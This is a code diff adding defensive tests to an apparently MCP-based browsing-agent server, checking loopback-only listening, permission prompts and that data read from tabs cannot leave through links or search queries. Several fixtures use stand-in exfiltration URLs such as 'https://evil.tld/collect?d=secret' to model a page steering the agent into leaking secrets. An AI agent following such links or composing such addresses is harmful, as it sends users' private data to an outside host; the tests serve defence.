@@ -1,6 +1,7 @@
 import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
 import { mkdir, readdir, readFile, writeFile } from "node:fs/promises";
 import { existsSync } from "node:fs";
+import { Server } from "node:net";
 import { dirname, join } from "node:path";
 import { BrowsingNotes, NOTES_PREFIX } from "../../src/search/notes.js";
 import { createRecaps } from "../../src/recaps/recaps.js";
@@ -780,6 +781,17 @@ test("harvest_widget reports the created run, even for a widget that gains its a
   const t = text(await client.callTool({ name: "harvest_widget", arguments: { id: "daily" } }));
   expect(t).toContain('"run": "2026-10-28T10-00-00-000Z"');
   expect(t).not.toContain("secret du compte");
+});
+
+test("the server listens on loopback only by default", async () => {
+  const listen = vi.spyOn(Server.prototype, "listen");
+  const s = await startMcpServer({ locale: () => "fr", bridge: new FakeBridge([], { active: null, allow: false }), policy: new AccessPolicy(), token: generateToken() });
+  try {
+    expect(listen.mock.calls.at(-1)?.[1]).toBe("127.0.0.1");
+  } finally {
+    listen.mockRestore();
+    await s.stop();
+  }
 });
 
 // --- Per-window sessions and open_workflow ---
@@ -2463,6 +2475,19 @@ test("open_tab during a search asks the card for an address not read (with its r
   }, { address: true });
 });
 
+test("a link list read on a local page stays the agent's writing after the tab goes back to a site: navigate by number asks the card", async () => {
+  await withSearch(async ({ call, fake }) => {
+    expect((await call("navigate", { id: "github", url: "http://localhost:3002/" })).isError).toBe(false);
+    fake.linkSequence = [[{ text: "Suite", url: "https://evil.tld/collect?d=secret" }]];
+    expect((await call("read_tab", { id: "github", links: true })).text).toContain("0. Suite — https://evil.tld/collect?d=secret");
+    // The user takes the tab back to the site and speaks from it.
+    await fake.navigate("github", github.url);
+    expect((await call("navigate", { id: "github", link: 0 })).text).toBe(DENIAL_TEXT);
+    expect(fake.calls.filter((x) => x.method === "askAddress")).toHaveLength(1);
+    expect(fake.calls.some((x) => x.method === "navigate" && x.args[1] === "https://evil.tld/collect?d=secret")).toBe(false);
+  }, { address: false, allow: true });
+});
+
 test("outside a search, a composed address asks its card once per conversation; refused, nothing opens; read, local or a readable tab's address is free", async () => {
   await withSearch(async ({ call, fake }) => {
     expect((await call("open_tab", { url: "https://evil.tld/?d=secret", reason: "voir" })).text).toBe(DENIAL_TEXT);
@@ -3107,4 +3132,52 @@ describe("agent activity", () => {
       expect(got).toEqual([{ tab: "search-1", label: "Lit 3 pages" }]);
     }, { onActivity: (x) => got.push(x) });
   });
+});
+
+test("under the main token, a query is checked against what every window read", async () => {
+  await withSearch(async ({ call, fake, search, bands, policy, s }) => {
+    policy.grant(mailTab);
+    await call("read_tab", { id: "gmail" }, s.openSession("W1"));
+    const pending = call("search_web", { query: "camille.roussel@example.com" });
+    await vi.waitFor(() => expect(bands.at(-1)![1]?.state).toBe("yours"));
+    expect(bands.at(-1)![1]!.text).toContain("lu dans mail.google.com");
+    expect(opens(fake)).toEqual([{ query: "" }]);
+    search.continue("search-1");
+    await pending;
+  }, { outflow: new Outflow(), tabs: [github, mailTab] });
+});
+
+test("a sensitive tab and the history ask again during another window's search, whatever the token", async () => {
+  await withSearch(async ({ call, fake, policy, s }) => {
+    const asks = () => fake.calls.filter((x) => x.method === "askPermission").length;
+    const w1 = s.openSession("W1");
+    policy.grant(gmail);
+    await call("search_web", { query: "x" }, w1);
+    await call("read_tab", { id: "gmail" }, s.openSession("W2"));
+    expect(asks()).toBe(1);
+    // Once per search, whoever reads.
+    await call("read_tab", { id: "gmail" });
+    await call("read_tab", { id: "gmail" }, w1);
+    expect(asks()).toBe(1);
+  }, { allow: true, tabs: [github, gmail] });
+  // Two searches: a window that borrows the other's token, whose search already asked, still meets its own search's card.
+  await withSearch(async ({ call, fake, policy, s }) => {
+    const asks = () => fake.calls.filter((x) => x.method === "askPermission").length;
+    const a = s.openSession("A");
+    const b = s.openSession("B");
+    policy.grant(gmail);
+    await call("search_web", { query: "x" }, a);
+    await call("read_tab", { id: "gmail" }, a);
+    expect(asks()).toBe(1);
+    await call("search_web", { query: "y" }, b);
+    await call("read_tab", { id: "gmail" }, a);
+    expect(asks()).toBe(2);
+  }, { allow: true, tabs: [github, gmail] });
+  await withSearch(async ({ call, fake, policy, s }) => {
+    const cards = () => fake.calls.filter((x) => x.method === "askWidgetData").length;
+    policy.grantHistory();
+    await call("search_web", { query: "x" }, s.openSession("W1"));
+    await call("search_history", { query: "h" });
+    expect(cards()).toBe(1);
+  }, { withUserData: true });
 });
